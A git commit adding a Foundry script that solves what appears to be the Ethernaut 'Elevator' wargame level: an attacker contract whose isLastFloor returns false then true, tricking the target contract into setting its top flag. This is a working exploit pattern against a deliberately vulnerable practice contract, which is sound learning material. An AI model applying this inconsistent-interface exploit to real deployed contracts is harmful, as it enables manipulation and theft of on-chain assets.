7289be84498155ee296f8e4f4b89bdc75e2376b7
pavansarvesh <pavansarvesh31@gmail.com>
2025-06-30 05:10:47 +0000

    code : Completed Level 11

--- script/level11Solution.s.sol
+++ script/level11Solution.s.sol
@@ -5,16 +5,29 @@ import {Script} from "forge-std/Script.sol";
 import {console} from "forge-std/console.sol";
 import {Elevator} from "../src/level11Elevator.sol";
 
-contract Level11Solution is Script {
-    Elevator elevator = Elevator(0xaa2f7909dD42f78Ddd53205600aa8c14a71fE6Fc);
+contract MyBuilding {
+    Elevator elevator = Elevator(0x7308cF93f1811Bf3cADac96b7154F2627B9a068f);
+    bool public mySwitch;
 
+    function startAttack() external {
+        elevator.goTo(0);
+    }
+
+    function isLastFloor(uint256) external returns (bool) {
+        if (!mySwitch) {
+            mySwitch = true;
+            return false;
+        } else {
+            return true;
+        }
+    }
+}
+
+contract Level10Solution is Script {
     function run() external {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-        console.log(elevator.floor());
-        console.log(elevator.top());
-        // elevator.goTo();
-        console.log(elevator.floor());
-        console.log(elevator.top());
+        MyBuilding building = new MyBuilding();
+        building.startAttack();
         vm.stopBroadcast();
     }
 }
